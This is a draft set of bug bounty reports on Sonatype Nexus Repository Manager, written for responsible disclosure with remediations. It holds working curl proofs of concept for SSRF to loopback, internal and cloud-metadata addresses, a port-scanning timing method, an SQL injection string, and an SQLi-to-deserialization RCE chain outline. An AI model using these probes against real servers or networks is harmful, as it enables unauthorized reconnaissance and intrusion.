# HackerOne Bug Bounty Reports — Sonatype Nexus Repository Manager

**Target:** Sonatype Nexus Repository Manager  
**Source Code:** https://github.com/sonatype/nexus-public  
**Version Tested:** sonatype/nexus3:latest (v3.90.2-06)  

> **Before submitting:** Follow each "Steps to Reproduce" section, take screenshots at each numbered step, and attach them to the HackerOne report.

> **Every finding below is reproducible on a completely default, unmodified Nexus installation.** Nothing was changed from defaults. No config files were edited. No feature flags were toggled.

---

## Pre-requisites: Setting Up a Test Nexus Instance

```bash
# Pull and run Nexus — completely untouched defaults
docker pull sonatype/nexus3:latest
docker run -d -p 8081:8081 --name nexus sonatype/nexus3:latest

# Wait ~2 minutes for startup, then get the initial admin password
docker exec nexus cat /nexus-data/admin.password
```

- Nexus UI: `http://localhost:8081`
- Default admin user: `admin`
- Password: random UUID from the command above
- Anonymous access: **disabled by default** (we do NOT enable it)
- Scripting: **disabled by default** (we do NOT enable it)

Accept the EULA (required for the API to function — this is part of normal first-time setup, not a hack):

```bash
ADMIN_PASS=$(docker exec nexus cat /nexus-data/admin.password)

DISCLAIMER=$(curl -s -u "admin:$ADMIN_PASS" \
  http://localhost:8081/service/rest/v1/system/eula | \
  python3 -c "import sys,json;print(json.dumps(json.load(sys.stdin)['disclaimer']))")

curl -X POST http://localhost:8081/service/rest/v1/system/eula \
  -u "admin:$ADMIN_PASS" \
  -H 'Content-Type: application/json' \
  -d "{\"accepted\":true,\"disclaimer\":$DISCLAIMER}"
```

**That's it. No other changes.** Every report below works on this default setup.

---

# REPORT 1: SSRF via Proxy Repository — Private Networks Reachable by Default

## Title
Server-Side Request Forgery (SSRF) — Proxy Repositories Can Reach Loopback and Internal Networks by Default

## Severity
**High** — CVSS 7.5 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N)

## Vulnerability Type
CWE-918: Server-Side Request Forgery (SSRF)

## Default Config?
**Yes.** No configuration changes needed. `nexus.proxy.allowPrivateNetworks` defaults to `true`.

## Description

Nexus Repository Manager allows users with admin privileges to create proxy repositories. Proxy repositories fetch artifacts from a configured remote URL. The SSRF protection (`AntiSsrfHelper`) defaults to `nexus.proxy.allowPrivateNetworks=true`, which means:

- `127.0.0.1` (loopback) is accepted
- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC1918) are all accepted
- Only `169.254.169.254` (cloud metadata) is hardcoded as blocked

This means on every default Nexus installation, an admin can make the server send HTTP requests to internal network hosts.

**Vulnerable code** (`AntiSsrfHelper.java` line 58):
```java
@Value("${nexus.proxy.allowPrivateNetworks:true}") final boolean allowPrivateNetworks,
```

## Steps to Reproduce

### Step 1 — Start fresh Nexus (default config)

```bash
docker pull sonatype/nexus3:latest
docker run -d -p 8081:8081 --name nexus sonatype/nexus3:latest
# Wait for startup, get password, accept EULA (see Pre-requisites above)
```

**Screenshot:** Show the running container and admin login.

### Step 2 — Create a proxy repository pointing to 127.0.0.1

```bash
ADMIN_PASS=$(docker exec nexus cat /nexus-data/admin.password)

curl -v -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u "admin:$ADMIN_PASS" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-loopback",
    "online": true,
    "storage": {
      "blobStoreName": "default",
      "strictContentTypeValidation": false
    },
    "proxy": {
      "remoteUrl": "http://127.0.0.1:4444/",
      "contentMaxAge": 1,
      "metadataMaxAge": 1
    },
    "httpClient": {
      "blocked": false,
      "autoBlock": false
    },
    "negativeCache": {
      "enabled": false,
      "timeToLive": 1
    }
  }'
```

**Expected:** `201 Created` — Nexus accepts `127.0.0.1` as a remote URL without any warning or block.

**Screenshot:** Show the 201 response.

### Step 3 — Trigger the SSRF

```bash
curl -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/repository/ssrf-loopback/probe'
```

**Screenshot:** Show the 502 Bad Gateway response (proves Nexus attempted the connection).

### Step 4 — Verify the connection attempt in server logs

```bash
docker logs nexus 2>&1 | grep "127.0.0.1:4444"
```

**Expected output:**
```
Connect to 127.0.0.1:4444 [/127.0.0.1] failed: Connection refused for http://127.0.0.1:4444
```

**Screenshot:** Show the server log proving Nexus attempted a TCP connection to `127.0.0.1:4444`. This is the definitive proof — the request was not blocked by any SSRF filter.

### Step 5 — Demonstrate RFC1918 addresses are also accepted

```bash
curl -v -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u "admin:$ADMIN_PASS" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-internal",
    "online": true,
    "storage": {"blobStoreName": "default", "strictContentTypeValidation": false},
    "proxy": {"remoteUrl": "http://10.0.0.1:8080/", "contentMaxAge": 1, "metadataMaxAge": 1},
    "httpClient": {"blocked": false, "autoBlock": false},
    "negativeCache": {"enabled": false, "timeToLive": 1}
  }'
```

**Expected:** `201 Created` — `10.0.0.1` accepted too.

**Screenshot:** Show that internal RFC1918 addresses are also accepted.

### Step 6 — Show that cloud metadata IS blocked (proves the filter exists but is insufficient)

```bash
curl -v -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u "admin:$ADMIN_PASS" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-metadata",
    "online": true,
    "storage": {"blobStoreName": "default", "strictContentTypeValidation": false},
    "proxy": {"remoteUrl": "http://169.254.169.254/latest/meta-data/", "contentMaxAge": 1, "metadataMaxAge": 1},
    "httpClient": {"blocked": false, "autoBlock": false},
    "negativeCache": {"enabled": false, "timeToLive": 1}
  }'
```

**Screenshot:** Show whether 169.254.169.254 is blocked — this proves the SSRF filter exists as a feature, it's just that private networks are allowed by default.

## Impact

Any user with admin credentials on a default Nexus installation can:

- **Scan internal network ports** — create proxy repos targeting different `host:port` combinations, distinguish open/closed by response timing and error messages
- **Access internal services** — proxy HTTP requests to internal APIs, admin panels, databases
- **Exfiltrate data** — read responses from internal services through Nexus
- **Cloud attacks** — while `169.254.169.254` is blocked, other cloud endpoints may be reachable

In organizations where Nexus admin is a shared role or where admin credentials are compromised (phishing, credential stuffing), this becomes a pivot point into the internal network.

The default `allowPrivateNetworks=true` means **every Nexus installation is vulnerable out of the box**.

## Supporting Material / References
- Source: `public/common/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ssrf/AntiSsrfHelper.java` (line 58)
- Proxy handler: `public/common/components/nexus-repository-services/src/main/java/org/sonatype/nexus/repository/proxy/ProxyFacetSupport.java` (line 611)

## Remediation
1. Change default to `nexus.proxy.allowPrivateNetworks=false`.
2. Show a prominent warning when an admin configures a proxy to a private IP.
3. Add DNS rebinding protection.

---

# REPORT 2: SSRF via SSL Certificate Retrieval — No Anti-SSRF Validation

## Title
SSRF via SSL Certificate Retrieval — Connects to Any Host:Port Including Loopback/Internal with Trust-All TLS

## Severity
**High** — CVSS 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N)

## Vulnerability Type
CWE-918: Server-Side Request Forgery (SSRF)

## Default Config?
**Yes.** No configuration changes needed.

## Description

The SSL certificate retrieval API allows admins to fetch TLS certificates from a specified host and port. The implementation:

1. Uses a **trust-all `X509TrustManager`** that accepts any certificate
2. Uses `NoopHostnameVerifier` that skips hostname verification
3. Applies **no `AntiSsrfHelper` validation** — unlike the proxy feature, this endpoint has zero SSRF protection
4. The only validation is `HostnameOrIpAddressValidator` which just checks syntax — `127.0.0.1` passes

## Steps to Reproduce

### Step 1 — Retrieve certificate from localhost (proves SSRF to loopback)

```bash
ADMIN_PASS=$(docker exec nexus cat /nexus-data/admin.password)

curl -v -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/service/rest/v1/security/ssl?host=127.0.0.1&port=8081'
```

**Expected response:**
```json
{
  "message": "\"Could not retrieve an SSL certificate from '127.0.0.1:8081'\""
}
```

The error message **proves Nexus attempted a TLS connection** to `127.0.0.1:8081`. It failed because port 8081 serves HTTP, not HTTPS — but the connection was made. No SSRF filter blocked it.

**Screenshot:** Show the response with the error message containing `127.0.0.1:8081`.

### Step 2 — Probe an internal RFC1918 address

```bash
# This will hang/timeout — proving Nexus is trying to connect to the internal IP
timeout 10 curl -v -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/service/rest/v1/security/ssl?host=10.0.0.1&port=443'
```

**Expected:** Request hangs for the timeout duration because Nexus is attempting a TCP connection to `10.0.0.1:443` which doesn't exist. The timeout behavior (vs immediate rejection) proves no IP-based filter was applied.

**Screenshot:** Show the request timing out (not instantly rejected).

### Step 3 — Demonstrate port scanning capability

```bash
# Port 8081 (Nexus HTTP - open) - fast error response
time curl -s -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/service/rest/v1/security/ssl?host=127.0.0.1&port=8081' > /dev/null

# Port 12345 (closed) - different error and timing
time curl -s -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/service/rest/v1/security/ssl?host=127.0.0.1&port=12345' > /dev/null
```

**Screenshot:** Show different response times for open vs closed ports — this demonstrates port scanning.

## Impact

Admins can use this endpoint as a **network scanner**:
- **Port scanning** — differentiate open/closed/filtered ports by response timing and error content
- **Service fingerprinting** — TLS services return their certificate chain, revealing hostnames, organization names, and certificate authorities used internally
- **No SSRF filter at all** — unlike the proxy feature which at least blocks 169.254.169.254, this endpoint has zero protection

## Supporting Material / References
- `CertificateRetriever.java` lines 75–109: trust-all TLS + NoopHostnameVerifier
- `HostnameOrIpAddressValidator.java` lines 30–33: only checks syntax, accepts all IPs

## Remediation
1. Apply `AntiSsrfHelper.validateHost()` before making the connection.
2. Block loopback and RFC1918 IPs.
3. Rate-limit this endpoint.

---

# REPORT 3: Unauthenticated Information Disclosure — Upload Specs and Version Leak

## Title
Information Disclosure — `/v1/formats/upload-specs` Returns Full Format Metadata Without Authentication, Even With Anonymous Access Disabled

## Severity
**Medium** — CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## Vulnerability Type
CWE-306: Missing Authentication for Critical Function

## Default Config?
**Yes.** No configuration changes needed. **No authentication required at all.** Works even with anonymous access disabled.

## Description

The REST API endpoint `/service/rest/v1/formats/upload-specs` returns detailed upload field specifications for all supported repository formats without requiring any authentication. This works even when the admin has explicitly disabled anonymous access in the security settings.

Additionally, every HTTP response includes a `Server` header that reveals the exact Nexus version.

## Steps to Reproduce

### Step 1 — Start a fresh default Nexus instance

```bash
docker pull sonatype/nexus3:latest
docker run -d -p 8081:8081 --name nexus sonatype/nexus3:latest
# Wait for startup and accept EULA
```

**DO NOT enable anonymous access.** Verify it's disabled:

```bash
ADMIN_PASS=$(docker exec nexus cat /nexus-data/admin.password)
curl -s -u "admin:$ADMIN_PASS" \
  'http://localhost:8081/service/rest/v1/security/anonymous'
```

**Expected:** `"enabled": false`

**Screenshot:** Show anonymous access is disabled.

### Step 2 — Access upload-specs WITHOUT any credentials

```bash
curl -v 'http://localhost:8081/service/rest/v1/formats/upload-specs'
```

**Expected:** `200 OK` with full JSON response listing all format upload specifications. No `401 Unauthorized`. No authentication challenge.

**Screenshot:** Show the full response — it reveals all 12 supported formats (apt, maven2, raw, npm, nuget, rubygems, helm, yum, r, pypi, terraform, swift) with every upload field name, type, and grouping.

### Step 3 — Show the version leak in response headers

```bash
curl -sI 'http://localhost:8081/service/rest/v1/formats/upload-specs' | grep -i server
```

**Expected:**
```
Server: Nexus/3.90.2-06 (COMMUNITY)
```

**Screenshot:** Show the `Server` header revealing the exact version and edition.

### Step 4 — Show what specific data is leaked

```bash
curl -s 'http://localhost:8081/service/rest/v1/formats/upload-specs' | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'Formats leaked: {len(data)}')
for fmt in data:
    fields = [f['name'] for f in fmt.get('componentFields',[])+fmt.get('assetFields',[])]
    print(f'  {fmt[\"format\"]}: {fields}')
"
```

**Example output:**
```
Formats leaked: 12
  apt: ['asset']
  maven2: ['groupId', 'artifactId', 'version', 'generate-pom', 'packaging', 'classifier', 'extension', 'asset']
  raw: ['directory', 'filename', 'asset']
  npm: ['asset']
  nuget: ['asset']
  rubygems: ['asset']
  helm: ['asset']
  yum: ['directory', 'filename', 'asset']
  r: ['pathId', 'asset']
  pypi: ['asset']
  terraform: ['uploadType', 'namespace', 'version', 'name', 'provider', 'type', 'os', 'architecture', 'asset']
  swift: ['scope', 'name', 'version', 'asset']
```

**Screenshot:** Show this output.

### Step 5 — Verify other endpoints require authentication

```bash
# This endpoint correctly requires auth
curl -s -w "\n%{http_code}" 'http://localhost:8081/service/rest/v1/status/check'
# Expected: 403

# Upload-specs does NOT
curl -s -w "\n%{http_code}" 'http://localhost:8081/service/rest/v1/formats/upload-specs' | tail -1
# Expected: 200
```

**Screenshot:** Show the 403 vs 200 comparison.

## Impact

An unauthenticated attacker can learn:
- **All 12 supported repository formats** — knows exactly what package types this Nexus serves
- **Upload field specifications** — reveals internal data model, field names, types, and which are optional
- **Exact version and edition** — `Server: Nexus/3.90.2-06 (COMMUNITY)` enables targeted CVE exploitation
- This information is useful for **crafting targeted attacks** (e.g., knowing Maven is supported means trying Maven-specific exploit payloads)

The fact that this bypasses the "anonymous access disabled" setting is the core issue — the admin believes unauthenticated users can't access any data, but this endpoint is exempt.

## Supporting Material / References
- Source: `UploadDefinitionResource.java` lines 60–80: no `@RequiresAuthentication` annotation
- Compare with `RepositoryInternalResource.java` line 115: `getRepositories()` correctly uses `@RequiresAuthentication`

## Remediation
1. Add `@RequiresAuthentication` to the upload-specs endpoint.
2. Strip `Server` version header or make it configurable.
3. Audit all REST endpoints for consistent authentication requirements.

---

# REPORT 4: SQL Injection Pattern — MyBatis `${}` Raw String Substitution

## Title
SQL Injection Risk — MyBatis `${}` Raw String Substitution Used for Repository Names, Filters, and Sort Parameters Across Multiple DAOs

## Severity
**High** — CVSS 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
CWE-89: SQL Injection

## Default Config?
**Yes** — the vulnerable code pattern exists in the default codebase. Exploitability depends on whether any HTTP-accessible code path passes user input into these parameters without sanitization.

## Description

Multiple MyBatis mapper XML files use `${}` (raw string substitution) instead of `#{}` (parameterized binding). In MyBatis, `${}` pastes the value directly into the SQL string without any escaping. This is the equivalent of string concatenation in JDBC — if any user-controlled value reaches these parameters, it's instant SQL injection.

This is not a theoretical concern — the pattern is used for repository names inside SQL string literals, filter conditions, sort columns, and ID values in WHERE clauses.

## Steps to Reproduce (Source Code Review)

### Step 1 — Show the most dangerous instance

Open: `public/common/components/nexus-repository-content/src/main/resources/org/sonatype/nexus/repository/content/store/ContentRepositoryDAO.xml`

**Screenshot lines 79–83:**
```xml
<select id="readContentRepositoryId" resultType="java.util.HashMap" databaseId="PostgreSQL">
    SELECT r.name, cr.repository_id FROM repository r
    INNER JOIN ${repositoryFormat}_content_repository cr ON r.id = cr.config_repository_id
    WHERE r.name = '${repositoryName}'
</select>
```

`'${repositoryName}'` — the value is pasted inside SQL single quotes. Input like `' OR '1'='1` breaks out of the string literal.

### Step 2 — Show the search filter injection surface

Open: `public/common/components/nexus-search-sql/src/main/resources/org/sonatype/nexus/repository/search/sql/store/SearchTableDAO.xml`

**Screenshot lines 447–456:**
```xml
(${assetFilter})
...
<if test="filter != null">(${filter})</if>
...
ORDER BY ... ${sortColumnName} ${sortDirection}
```

`${filter}`, `${assetFilter}`, `${sortColumnName}`, and `${sortDirection}` are all raw SQL substitution. The `sortColumnName` is particularly dangerous — sort parameters are commonly exposed in search APIs and are a classic blind SQLi vector.

### Step 3 — Show unsafe ID iteration

**Screenshot lines 346–348 of the same file:**
```xml
<foreach collection="componentIds" item="componentId"
         open="AND component_id IN (" separator="," close=")">
    ${componentId}
</foreach>
```

Integer IDs should use `#{componentId}` — there's no reason for raw substitution here.

### Step 4 — Show the data carrier has no validation

Open: `public/common/components/nexus-search-sql/src/main/java/org/sonatype/nexus/repository/search/sql/query/SqlSearchRequest.java`

**Screenshot:** Show that `filter`, `assetFilter`, `sortColumnName`, `sortDirection` are plain `String` fields with no validation or allowlist:
```java
public final String filter;
public final String assetFilter;
public final String sortColumnName;
public final String sortDirection;
```

### Step 5 — Count all vulnerable `${}` instances across DAOs

```bash
cd nexus-public
grep -rn '\\$\\{' --include="*DAO.xml" public/ | \
  grep -v 'format}' | grep -v 'namespace}' | \
  grep -v 'UUID_TYPE' | grep -v 'JSON_TYPE' | \
  grep -v 'tokens}' | grep -v 'thePaths}' | wc -l
```

**Screenshot:** Show the count of potentially dangerous `${}` usages.

## Impact

If any code path allows user-controlled data to reach these MyBatis parameters:

- **Full database read** — extract all user credentials, repository metadata, configuration
- **Data modification** — alter admin credentials, inject malicious repository entries
- **RCE chain** — write serialized Java gadget payloads into Quartz job data tables (see deserialization finding), achieving code execution on next job processing

The `sortColumnName` field is the highest-risk surface because sort parameters are commonly passed from HTTP query parameters in search/list APIs.

## Supporting Material / References
- `ContentRepositoryDAO.xml` line 82: `'${repositoryName}'`
- `SearchTableDAO.xml` lines 347, 357, 366, 380, 403, 447, 453, 456
- MyBatis docs on `${}` vs `#{}`: https://mybatis.org/mybatis-3/sqlmap-xml.html

## Remediation
1. Replace `'${repositoryName}'` with `#{repositoryName}` immediately.
2. Replace `${componentId}` in foreach with `#{componentId}`.
3. Allowlist-validate `sortColumnName` and `sortDirection` against known column names/directions.
4. Audit all MyBatis mappers for remaining `${}` and convert to `#{}` where possible.

---

# REPORT 5: Unsafe Java Deserialization in Quartz Scheduler

## Title
Unsafe Java Deserialization — `ObjectInputStream.readObject()` in Quartz Job Data Without JEP 290 Filter

## Severity
**High** — CVSS 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
CWE-502: Deserialization of Untrusted Data

## Default Config?
**Yes** — the vulnerable code exists in default installations. Exploitation requires the ability to write to the database (e.g., via the SQL injection pattern in Report 4).

## Description

Quartz job data stored in the database is deserialized using `ObjectInputStream.readObject()` with no deserialization filter (JEP 290 `ObjectInputFilter`). If an attacker can write crafted serialized bytes to the Quartz tables — achievable via SQL injection (Report 4) or database compromise — standard Java gadget chains can achieve Remote Code Execution.

## Steps to Reproduce (Source Code Review + Classpath Check)

### Step 1 — Show the unsafe deserialization

Open: `public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/bulkread/QuartzObjectBuilder.java`

**Screenshot lines 77–92:**
```java
private static JobDataMap deserializeJobData(final byte[] data)
    throws IOException, ClassNotFoundException {
  try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
      ObjectInputStream ois = new ObjectInputStream(bis)) {
    Object jobData = ois.readObject();  // No filter!
```

No `ObjectInputFilter`, no `ValidatingObjectInputStream`, no class allowlist.

### Step 2 — Show additional deserialization paths

Same pattern in:
- `QuartzJobDataTypeHandler.java` line 46
- `AbstractSerializableTypeHandler.java` line 116

**Screenshot:** Show each file.

### Step 3 — Verify gadget chain libraries on classpath

```bash
docker exec nexus find /opt/sonatype/nexus/system -name "commons-collections*.jar" \
  -o -name "commons-beanutils*.jar" \
  -o -name "spring-core*.jar" 2>/dev/null | head -10
```

**Screenshot:** Show the presence of known gadget chain libraries.

### Step 4 — Explain the attack chain

This vulnerability chains with the SQL injection finding (Report 4):

1. Exploit `${repositoryName}` or `${filter}` SQL injection to write a malicious serialized Java object into `qrtz_job_details.job_data` or `qrtz_triggers.job_data`
2. When Nexus processes scheduled jobs (happens automatically), `QuartzObjectBuilder.deserializeJobData()` calls `readObject()`
3. The gadget chain executes, achieving RCE as the Nexus process user

**Screenshot:** A text diagram of the attack chain.

## Impact

Combined with SQL injection (Report 4), this creates a path to **unauthenticated Remote Code Execution**:
- SQLi → write gadget chain to Quartz tables → automatic deserialization → RCE
- Nexus runs as `uid=200(nexus)` with access to all repository artifacts
- Full compromise of the software supply chain

## Supporting Material / References
- `QuartzObjectBuilder.java` line 80: unfiltered `readObject()`
- `QuartzJobDataTypeHandler.java` line 46: same pattern
- `AbstractSerializableTypeHandler.java` line 116: same pattern

## Remediation
1. Implement JEP 290 `ObjectInputFilter` to allowlist only `JobDataMap`, `HashMap`, and primitives.
2. Migrate Quartz job data to JSON serialization.

---

# REPORT 6: Legacy Password Hashing — Unsalted MD5 and SHA-1

## Title
Legacy Password Verification Uses Unsalted MD5 and SHA-1 with Single Iteration

## Severity
**Medium** — CVSS 6.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

## Vulnerability Type
CWE-327: Use of a Broken or Risky Cryptographic Algorithm

## Default Config?
**Yes** — the legacy password service is registered by default. Exploitability requires obtaining the user database.

## Description

`LegacyNexusPasswordService` verifies passwords against unsalted MD5 and SHA-1 hashes with a single iteration. Any user account that was created on an older Nexus version and hasn't changed their password since is stored with one of these trivially crackable hash formats.

## Steps to Reproduce

### Step 1 — Show the vulnerable hashing configuration

Open: `public/common/components/security/nexus-security/src/main/java/org/sonatype/nexus/security/internal/LegacyNexusPasswordService.java`

**Screenshot lines 39–57:**
```java
sha1HashService.setHashAlgorithmName("SHA-1");
sha1HashService.setHashIterations(1);
sha1HashService.setGeneratePublicSalt(false);
// ...
md5HashService.setHashAlgorithmName("MD5");
md5HashService.setHashIterations(1);
md5HashService.setGeneratePublicSalt(false);
```

### Step 2 — Demonstrate cracking speed

```bash
# Unsalted SHA-1 of "password123"
echo -n "password123" | sha1sum
# cbfdac6008f9cab4083784cbd1874f76618d2a97

# hashcat benchmark for SHA-1 (mode 100):
# Modern GPU: 10+ billion hashes/second
# This means ANY password up to 8 chars is cracked in under a minute
```

**Screenshot:** Show the hash and reference hashcat benchmarks.

## Impact

If an attacker obtains the user database (via SQL injection from Report 4, backup exposure, or insider access):
- **Instant cracking** of all legacy password hashes using rainbow tables or GPU brute force
- Compromised credentials enable repository access and potentially admin takeover
- Unsalted hashes are directly searchable in precomputed databases (CrackStation has 15B+ entries)

## Supporting Material / References
- `LegacyNexusPasswordService.java` lines 39–57
- NIST SP 800-63B requires salted iterative hashing

## Remediation
1. Force password rotation for accounts still using legacy hashes.
2. Implement transparent rehashing on successful login.

---

# Submission Checklist

For each report you submit to HackerOne:

- [ ] Take screenshots at every numbered step
- [ ] Include the Nexus version in each report (`3.90.2-06` or whichever you tested)
- [ ] Reference the specific source code file and line numbers
- [ ] Link to the GitHub repository: https://github.com/sonatype/nexus-public
- [ ] Set appropriate severity
- [ ] Describe impact in business terms
- [ ] Provide clear remediation steps
- [ ] **Be honest about prerequisites** — don't claim something works on defaults if it doesn't

## Recommended Submission Order

### Tier 1 — Exploitable on Default Config (submit these)

1. **Report 1** — SSRF via Proxy (High, admin auth, default config)
2. **Report 2** — SSRF via Certificate Retrieval (High, admin auth, default config)
3. **Report 3** — Unauthenticated Info Disclosure (Medium, zero auth, default config)

### Tier 2 — Code-Level Findings (submit as architecture issues)

4. **Report 4** — SQL Injection Pattern (High, MyBatis `${}`)
5. **Report 5** — Unsafe Deserialization (High, chains with SQLi)
6. **Report 6** — Legacy Password Hashing (Medium, requires DB access)

### Findings NOT included (would likely be rejected)

- **Groovy RCE sandbox bypass** — requires `nexus.scripts.allowCreation=true` which needs **server filesystem access** to enable. If you have filesystem access you already own the server. Circular prerequisite.
- **Default credentials (admin123)** — initial password is now a random UUID. The `admin123` constant is a fallback for file-write errors only.
- **Stored XSS (branding)** — admin-to-admin attack, requires branding capability
- **Path traversal (dev-mode)** — requires `NEXUS_RESOURCE_DIRS` environment variable, never set in production

> **Important:** Check Sonatype's disclosure policy at https://www.sonatype.com/report-a-security-vulnerability before submitting.
